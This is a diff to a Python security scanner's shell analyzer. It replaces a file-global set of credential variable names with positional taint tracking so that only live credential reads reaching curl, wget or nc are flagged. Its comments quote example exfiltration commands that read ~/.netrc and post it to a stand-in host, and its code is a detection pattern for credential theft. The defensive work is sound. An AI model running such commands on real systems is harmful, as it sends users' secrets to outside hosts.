@@ -12784,8 +12784,9 @@ def _sh_loop_cred_exfil_lines(source: str, masked: str) -> tuple:
         applies identically to the loop form). Reported in `direct_or_pipe_lines`.
       HOP — an in-body assignment `X=`/`X+=` whose value reads a `read_words`-seeded V
         (`$(cat "$V")` etc.); X then carries that taint at every later offset up to its
-        next non-accumulating rebinding, checked the same way the literal `cred_vars`
-        branch is (no B-415 exemption — the hop vocabulary has no TLS/k8s alternative).
+        next non-accumulating rebinding, checked the same nearest-prior-binding way
+        `_sh_cred_assign_taint_lines` (B-935) checks the literal `_SH_CRED_ASSIGN_RE`
+        form below (no B-415 exemption — the hop vocabulary has no TLS/k8s alternative).
         Reported in `hop_lines`.
       PIPE — the body streams a `read_words`-seeded V to stdout (`cat "$V"`, no `>`),
         and the matching `done` is piped into an outbound command; reported on `done`,
@@ -12992,6 +12993,94 @@ def _sh_loop_cred_exfil_lines(source: str, masked: str) -> tuple:
     return direct_hits, hop_hits
 
 
+# B-935: literal (non-loop) counterpart of the HOP role's positional lookup just
+# above. `cred_vars` (in `analyze_shell` below) used to be a flat, FILE-GLOBAL set of
+# variable names built once from every `_SH_CRED_ASSIGN_RE` match in the file, and the
+# sink check then matched any `$NAME` reference on any outbound line ANYWHERE in the
+# file — with no regard to whether THAT SPECIFIC reference still held the
+# credential-read value at that point. Two real shapes this let through:
+#   1. `C=$(cat ~/.netrc); C=$(date); curl -d "$C" https://x.example` — C is REBOUND
+#      to a harmless value before the sink runs, but the flat set still convicted.
+#   2. `curl -d "$X" https://x.example/t; X=$(cat ~/.netrc)` — the credential read
+#      happens AFTER the sink, not before; X is unset/unrelated when curl runs.
+# Fix: resolve each `$NAME` reference to its own nearest-PRIOR binding, using exactly
+# the SAME state-machine/bisect mechanism the HOP role above already uses
+# (`_SH_LOOP_BIND_RE` for every rebind event file-wide, `bisect_right` at reference
+# time) — not a second, independent dataflow engine. Unlike HOP, this is not scoped to
+# any loop region: every `_SH_LOOP_BIND_RE` match in the whole file is a rebind event
+# for its own name, and taint is seeded directly from `_SH_CRED_ASSIGN_RE` (the
+# UNCHANGED literal vocabulary), not from a loop-variable hop.
+def _sh_cred_assign_taint_lines(masked: str) -> set:
+    """1-indexed outbound lines where a `$NAME` reference positionally resolves —
+    by nearest PRIOR binding, never by file-global set membership — to a still-live
+    `_SH_CRED_ASSIGN_RE` credential-read value. `+=` accumulation keeps whatever taint
+    state the name already carried (mirrors the HOP role's own `keep` semantics: an
+    append can only add to what is already there, never launder it away); any other
+    rebind (`NAME=...`, `read NAME`, `unset NAME`, `mapfile`/`readarray NAME`,
+    `printf -v NAME`, a nested `for NAME in`, a bare `local`/`declare NAME`) clears it.
+
+    Safety net: a `_SH_CRED_ASSIGN_RE` match that `_SH_LOOP_BIND_RE` itself does not
+    also recognize as a bind (e.g. an assignment sitting somewhere `_SH_LOOP_CMD_POS`'s
+    command-position lookbehind does not cover) is still seeded as its own tainting
+    event at its own offset — this positional replacement must convict everything the
+    old flat set did, only scoped correctly to the right reference, never LESS.
+
+    KNOWN LIMITATION, same one already accepted for the HOP role's own loop-scoped
+    version (see the design note above `_sh_loop_cred_exfil_lines`, "a helper function
+    defined above the loop and called after it"): resolution is POSITIONAL, not
+    call-graph aware. A function whose body references NAME, textually written BEFORE
+    the credential-read assignment that (at runtime) only lands in NAME once the
+    function is later CALLED, is invisible here — the reference's own offset precedes
+    the binding's, so the nearest-prior-binding lookup finds nothing. This is a plain
+    forward reference through a delayed call, the same shape B-894 already carries as
+    a documented FN rather than inventing a call-graph model this scanner does not
+    have; `tests/test_b935_shell_cred_var_position_taint.py` pins it as an accepted,
+    B-894-consistent residual, not a silently-ignored gap.
+    """
+    text = _sh_loop_blank_heredocs(_sh_loop_join_continuations(masked))
+    kw = _sh_loop_code_mask(text)
+    cred_starts: dict = {}
+    for m in _SH_CRED_ASSIGN_RE.finditer(masked):
+        cred_starts.setdefault(m.group("var"), set()).add(m.start())
+    events: dict = {}
+    for b in _SH_LOOP_BIND_RE.finditer(kw):
+        if b.group("var") and b.group("op"):
+            name, op = b.group("var"), b.group("op")
+            off = b.start("var")
+            events.setdefault(name, []).append((off, op, off in cred_starts.get(name, ())))
+        else:
+            for nm in _sh_loop_bound_names(b):
+                events.setdefault(nm, []).append((b.end(), "clear", False))
+    for name, starts in cred_starts.items():
+        seen = {off for off, _op, _c in events.get(name, [])}
+        for off in starts - seen:
+            events.setdefault(name, []).append((off, "=", True))
+    state_hist: dict = {}
+    for name, evs in events.items():
+        evs.sort(key=lambda e: e[0])
+        offs, taints = [], []
+        cur = False
+        for off, op, is_cred in evs:
+            cur = (cur or is_cred) if op == "+=" else (False if op == "clear" else is_cred)
+            offs.append(off)
+            taints.append(cur)
+        state_hist[name] = (offs, taints)
+    hits: set = set()
+    if not state_hist:
+        return hits
+    pos = 0
+    for raw in masked.split("\n"):
+        i = masked.count("\n", 0, pos) + 1
+        if _SH_OUTBOUND_RE.search(raw) or _sh_bare_nc_invocation(raw):
+            for name, (offs, taints) in state_hist.items():
+                for rm in _sh_loop_ref_re(name).finditer(text, pos, pos + len(raw)):
+                    k = bisect.bisect_right(offs, rm.start())
+                    if k and taints[k - 1]:
+                        hits.add(i)
+        pos += len(raw) + 1
+    return hits
+
+
 def _sh_mask_comments(source: str) -> str:
     """Blank whole-line shell comments while preserving line numbers, so a documented
     'curl ... | sh' example in a comment can't fire."""
@@ -13081,12 +13170,18 @@ def analyze_shell(source: str, filename: str = "<skill>") -> list[ASTFinding]:
                 "(nc//dev/tcp) — credential exfiltration",
             )
 
-    cred_vars = {m.group("var") for m in _SH_CRED_ASSIGN_RE.finditer(masked)}
+    # B-935: `cred_var_lines` is the POSITIONAL replacement for the old flat,
+    # file-global `cred_vars` NAME set — see `_sh_cred_assign_taint_lines`'s own
+    # docstring above for why a name-membership check over-and-under-convicted (a
+    # rebound name stayed tainted forever; a name read only AFTER the sink line was
+    # tainted retroactively). It reports LINES, not names, because "is this reference
+    # live" is a per-reference question, not a per-name one.
+    cred_var_lines = _sh_cred_assign_taint_lines(masked)
     # B-894: loop-unrolled counterparts of the two checks below — see the design note
     # above `_sh_mask_comments`. `loop_direct_lines` is the DIRECT/PIPE roles (the
     # `_SH_CRED_FILE_RE` sink-line vocabulary, same message/exemption as the block right
-    # below); `loop_hop_lines` is the HOP role (joins `cred_vars`, same message, no
-    # exemption — matches how `cred_vars` itself gets none).
+    # below); `loop_hop_lines` is the HOP role (joins `cred_var_lines`, same message, no
+    # exemption — matches how `cred_var_lines` itself gets none).
     loop_direct_lines, loop_hop_lines = _sh_loop_cred_exfil_lines(source, masked)
     for i, raw in enumerate(masked.splitlines(), 1):
         # B-430: same OR pattern as above — see _sh_bare_nc_invocation's docstring.
@@ -13111,7 +13206,7 @@ def analyze_shell(source: str, filename: str = "<skill>") -> list[ASTFinding]:
             # DIFFERENT credential variable also sent on the same line. Fall
             # through to the variable check below instead of `continue`-ing
             # past it, so an exempt TLS path can never launder an unrelated
-            # `cred_vars` hit in the same command.
+            # `cred_var_lines` hit in the same command.
         if i in loop_direct_lines:
             add(
                 "SHELL_CRED_EXFIL",
@@ -13120,9 +13215,7 @@ def analyze_shell(source: str, filename: str = "<skill>") -> list[ASTFinding]:
                 "reads a credential file and sends it to an outbound command "
                 "(curl/wget/nc) — credential exfiltration",
             )
-        if any(re.search(r"\$\{?" + re.escape(v) + r"\b", raw) for v in cred_vars) or (
-            i in loop_hop_lines
-        ):
+        if i in cred_var_lines or i in loop_hop_lines:
             add(
                 "SHELL_CRED_EXFIL",
                 "crit",
